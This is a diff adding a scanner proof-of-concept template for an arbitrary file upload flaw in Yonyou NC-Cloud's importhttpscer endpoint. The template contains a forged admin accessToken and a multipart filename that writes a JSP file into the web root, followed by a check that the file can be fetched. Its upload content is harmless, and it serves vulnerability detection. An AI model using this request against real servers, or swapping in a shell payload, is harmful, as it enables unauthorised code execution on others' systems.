@@ -1,0 +1,61 @@
+id: poc-yaml-yongyou-nc-cloud-importhttpscer-anyfile-upload
+info:
+  name: 用友NC-Cloud importhttpscer 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: 文件上传
+  description: |
+    用友NC-Cloud存在一个任意文件上传漏洞，允许攻击者上传恶意文件。
+
+variables:
+  t1: "{{rand_text_alpha(4)}}"
+  t2: "{{base64(t1)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: "file-upload"
+    method: POST
+    path:
+      - "/nccloud/mob/pfxx/manualload/importhttpscer"
+    headers:
+      Content-Type: "multipart/form-data; boundary=fd28cb44e829ed1c197ec3bc71748df0"
+      accessToken: "eyJhbGciOiJIUzUxMiJ9.eyJwa19ncm91cCI6IjAwMDE2QTEwMDAwMDAwMDAwSkI2IiwiZGF0YXNvdXJjZSI6IjEiLCJsYW5nQ29kZSI6InpoIiwidXNlclR5cGUiOiIxIiwidXNlcmlkIjoiMSIsInVzZXJDb2RlIjoiYWRtaW4ifQ.XBnY1J3bVuDMYIfPPJXb2QC0Pdv9oSvyyJ57AQnmj4jLMjxLDjGSIECv2ZjH9DW5T0JrDM6UHF932F5Je6AGxA"
+    body: |-
+      --fd28cb44e829ed1c197ec3bc71748df0
+      Content-Disposition: form-data; name="file"; filename="./webapps/nc_web/{{t1}}.jsp"
+
+      {{t2}}
+      --fd28cb44e829ed1c197ec3bc71748df0--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{\"code\":\"1000000000\",\"message\":\"success\"}"
+        part: body
+
+  - id: "file-verification"
+    method: GET
+    path:
+      - "/{{t1}}.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
+        part: body
+      - type: word
+        words:
+          - "Server:"
+        part: header
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
